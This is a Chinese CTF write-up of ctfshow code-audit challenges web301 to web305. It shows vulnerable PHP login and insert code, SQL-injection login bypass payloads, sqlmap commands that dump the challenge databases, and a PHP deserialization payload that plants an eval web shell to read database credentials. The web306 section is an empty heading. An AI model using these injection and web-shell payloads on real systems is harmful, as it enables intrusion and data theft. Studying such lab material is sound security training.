## 写在前面

代码审计系列

——KonDream 2022年3月10日14:47:48

## web301

关键代码：checklogin.php

```php
<?php

error_reporting(0);
session_start();
require 'conn.php';
$_POST['userid']=!empty($_POST['userid'])?$_POST['userid']:"";
$_POST['userpwd']=!empty($_POST['userpwd'])?$_POST['userpwd']:"";
$username=$_POST['userid'];
$userpwd=$_POST['userpwd'];
$sql="select sds_password from sds_user where sds_username='".$username."' order by id limit 1;";
$result=$mysqli->query($sql);
$row=$result->fetch_array(MYSQLI_BOTH);
if($result->num_rows<1){
	$_SESSION['error']="1";
	header("location:login.php");
	return;
}
if(!strcasecmp($userpwd,$row['sds_password'])){
	$_SESSION['login']=1;
	$result->free();
	$mysqli->close();
	header("location:index.php");
	return;
}
$_SESSION['error']="1";
header("location:login.php");

?>
```

前10行，在登录检查时没有对参数进行过滤导致存在sql注入，这里直接sqlmap梭

``python sqlmap.py -u http://7b4b2479-9fc9-4eed-8697-b694f2b25701.challenge.ctf.show/checklogin.php --data="userid=1*&userpwd=1" --batch -D sds -T sds_user --dump``

![image-20220310144908186](image/ctfshow-代码审计(301-310)/image-20220310144908186.png)

拿到账号密码后无法登录？？奇怪，那利用联合查询登录吧

``userid=1' union select 1#&userpwd=1``

![image-20220310145037293](image/ctfshow-代码审计(301-310)/image-20220310145037293.png)

登录成功后即可拿到flag

## web302

在判断密码处改为

```php
if(!strcasecmp(sds_decode($userpwd),$row['sds_password']))
    
<?php
function sds_decode($str){
	return md5(md5($str.md5(base64_encode("sds")))."sds");
}
?>
```

也就是说我们传入的 userpwd 会经过 sds_decode 函数处理，这里我也爆了一下数据库，账户密码和上一个题是一样的，无法正常登录，所以利用联合查询：

```php
<?php
function sds_decode($str){
	return md5(md5($str.md5(base64_encode("sds")))."sds");
}

echo sds_decode('admin');
?>
# 27151b7b1ad51a38ea66b1529cde5ee4
```

payload：``userid=1'union select '27151b7b1ad51a38ea66b1529cde5ee4'#&userpwd=admin``

登录进去即可

## web303

审计源码，在sds_user.sql中有这样一条数据

```sql
INSERT INTO `sds_user` VALUES ('1', 'admin', '27151b7b1ad51a38ea66b1529cde5ee4');
```

结合之前的sds_decode操作，显然密码就是admin，登录进去之后找注入点，继续看源码发现

```php
<?php
session_start();
require 'conn.php';
if(!isset($_SESSION['login'])){
header("location:login.php");
return;
}else{
	//注入点
	$_POST['dpt_name']=!empty($_POST['dpt_name'])?$_POST['dpt_name']:NULL;
	$_POST['dpt_address']=!empty($_POST['dpt_address'])?$_POST['dpt_address']:NULL;
	$_POST['dpt_build_year']=!empty($_POST['dpt_build_year'])?$_POST['dpt_build_year']:NULL;
	$_POST['dpt_has_cert']=!empty($_POST['dpt_has_cert'])?$_POST['dpt_has_cert']:NULL;
	$_POST['dpt_cert_number']=!empty($_POST['dpt_cert_number'])?$_POST['dpt_cert_number']:NULL;
	$_POST['dpt_telephone_number']=!empty($_POST['dpt_telephone_number'])?$_POST['dpt_telephone_number']:NULL;
	
	$dpt_name=$_POST['dpt_name'];
	$dpt_address=$_POST['dpt_address'];
	$dpt_build_year=$_POST['dpt_build_year'];
	$dpt_has_cert=$_POST['dpt_has_cert']=="on"?"1":"0";
	$dpt_cert_number=$_POST['dpt_cert_number'];
	$dpt_telephone_number=$_POST['dpt_telephone_number'];
	$mysqli->query("set names utf-8");
	$sql="insert into sds_dpt set sds_name='".$dpt_name."',sds_address ='".$dpt_address."',sds_build_date='".$dpt_build_year."',sds_have_safe_card='".$dpt_has_cert."',sds_safe_card_num='".$dpt_cert_number."',sds_telephone='".$dpt_telephone_number."';";
	$result=$mysqli->query($sql);
	echo $sql;
	if($result===true){
		$mysqli->close();
		header("location:dpt.php");
	}else{
		die(mysqli_error($mysqli));
	}
	
	 }

?>
```

在 add 操作中存在 insert 注入，直接 sqlmap 一把梭

``python sqlmap.py -u http://a78b07f2-18c5-4d5e-bab7-32e53633624c.challenge.ctf.show/dptadd.php --data="dpt_address=&dpt_build_year=&dpt_cert_number=&dpt_has_cert=on&dpt_name=&dpt_telephone_number=" --cookie="UM_distinctid=17ede1c056746f-0f697bd214ac7a-f791539-144000-17ede1c0568983; PHPSESSID=4lh8e8angsna8eac4v08bhuold" --batch -D sds -T sds_fl9g --dump``

![image-20220310154405140](image/ctfshow-代码审计(301-310)/image-20220310154405140.png)

## web304

增加了全局waf

```php
function sds_waf($str){
	return preg_match('/[0-9]|[a-z]|-/i', $str);
}
```

不知道这个waf有啥用，姿势和上面一样

``python sqlmap.py -u http://02fec3b4-6e26-4559-80a6-23aa6ff85e75.challenge.ctf.show/dptadd.php --data="dpt_address=&dpt_build_year=&dpt_cert_number=&dpt_has_cert=on&dpt_name=&dpt_telephone_number=" --cookie="UM_distinctid=17ede1c056746f-0f697bd214ac7a-f791539-144000-17ede1c0568983; PHPSESSID=pq9v16je24q036vm433fi79i53" --batch -D sds -T sds_flaag --dump``

## web305

多了个class.php

```php
<?php

class user{
	public $username;
	public $password;
	public function __construct($u,$p){
		$this->username=$u;
		$this->password=$p;
	}
	public function __destruct(){
		file_put_contents($this->username, $this->password);
	}
}

```

再看看checklogin.php

```php
<?php
error_reporting(0);
session_start();
require 'conn.php';
require 'fun.php';
require 'class.php';
$user_cookie = $_COOKIE['user'];
if(isset($user_cookie)){
	$user = unserialize($user_cookie);
}
```

嗯？？反序列化，而且在 class.php 中是有写文件操作的，那么我们就可以利用反序列化写马然后去读数据库

payload：

```php
<?php
class user{
	public $username;
	public $password;
	public function __construct($u,$p){
		$this->username=$u;
		$this->password=$p;
	}
}

echo urlencode(serialize(new user('kkk.php', '<?=eval($_POST[k]);?>')));

# O%3A4%3A%22user%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22kkk.php%22%3Bs%3A8%3A%22password%22%3Bs%3A21%3A%22%3C%3F%3Deval%28%24_POST%5Bk%5D%29%3B%3F%3E%22%3B%7D
```

带到 cookie 中去然后发包

![image-20220310160858949](image/ctfshow-代码审计(301-310)/image-20220310160858949.png)

直接上蚁剑

![image-20220310160917567](image/ctfshow-代码审计(301-310)/image-20220310160917567.png)

读数据库，真正的账号密码在conn.php中

![image-20220310160948872](image/ctfshow-代码审计(301-310)/image-20220310160948872.png)

![image-20220310160957433](image/ctfshow-代码审计(301-310)/image-20220310160957433.png)

拿到flag

## web306

























